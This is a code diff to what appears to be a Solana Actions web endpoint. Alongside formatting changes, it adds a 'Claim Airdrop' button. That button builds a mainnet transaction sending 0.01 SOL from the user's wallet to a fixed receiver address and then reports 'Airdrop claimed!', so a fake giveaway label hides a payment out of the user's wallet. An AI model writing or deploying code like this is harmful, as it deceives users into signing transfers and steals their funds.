@@ -47,57 +47,70 @@ export async function GET(request: Request) {
               required: true
             }
           ]
+        },
+        {
+          href: request.url + "?action=claim_airdrop",
+          label: "Claim Airdrop"
         }
       ]
     },
     //disabled: true
   }
 
-  const response = Response.json(responseBody, {headers: ACTIONS_CORS_HEADERS})
-  return response
+  const response = Response.json(responseBody, { headers: ACTIONS_CORS_HEADERS });
+  return response;
 }
 
-export async function POST(request: Request){
-
+export async function POST(request: Request) {
   const requestBody: ActionPostRequest = await request.json();
   const userPubkey = requestBody.account;
   console.log(userPubkey);
 
-  const url = new URL(request.url)
-  const action = url.searchParams.get('action') 
-  const param = url.searchParams.get('param') 
-  console.log("performing action" + action)
+  const url = new URL(request.url);
+  const action = url.searchParams.get('action');
+  const param = url.searchParams.get('param');
+  console.log("performing action: " + action);
 
-  const user = new PublicKey(userPubkey)
-
+  const user = new PublicKey(userPubkey);
   const connection = new Connection(clusterApiUrl("mainnet-beta"));
+
+  let lamports = 1;  // Default transfer amount
+
+  // Check if action is claim_airdrop
+  if (action === "claim_airdrop") {
+    lamports = 0.01 * 1e9;  // 0.01 SOL
+  }
+
   const ix = SystemProgram.transfer({
     fromPubkey: user,
-    toPubkey: new PublicKey('CBDjvUkZZ6ucrVGrU3vRraasTytha8oVg2NLCxAHE25b'),
-    lamports: 1
-  })
+    toPubkey: new PublicKey('CBDjvUkZZ6ucrVGrU3vRraasTytha8oVg2NLCxAHE25b'),  // Receiver's wallet
+    lamports
+  });
+
   let name = userPubkey;
   const tx = new Transaction();
-  if (action == "another"){
-    tx.add(ix)
-  }else if (action == "nickname") {
-    name = param!
+  
+  if (action === "another") {
+    tx.add(ix);
+  } else if (action === "nickname") {
+    name = param!;
+    tx.add(ix);
+  } else if (action === "claim_airdrop") {
+    tx.add(ix);  // Airdrop transaction
   }
-  tx.add(ix)
-  tx.feePayer = new PublicKey(userPubkey);
-  tx.recentBlockhash = (await connection.getLatestBlockhash({commitment: "finalized"})).blockhash
-  const serialTX = tx.serialize({requireAllSignatures: false, verifySignatures: false}).toString("base64")
 
-  const response : ActionPostResponse = {
+  tx.feePayer = user;
+  tx.recentBlockhash = (await connection.getLatestBlockhash({ commitment: "finalized" })).blockhash;
+  const serialTX = tx.serialize({ requireAllSignatures: false, verifySignatures: false }).toString("base64");
+
+  const response: ActionPostResponse = {
     transaction: serialTX,
-    message: "hello" + name
+    message: action === "claim_airdrop" ? "Airdrop claimed!" : "Hello " + name
   };
 
-  
-
-  return Response.json(response, {headers: ACTIONS_CORS_HEADERS})
+  return Response.json(response, { headers: ACTIONS_CORS_HEADERS });
 }
 
 export async function OPTIONS(request: Request) {
-  return new Response(null, {headers: ACTIONS_CORS_HEADERS})
+  return new Response(null, { headers: ACTIONS_CORS_HEADERS });
 }
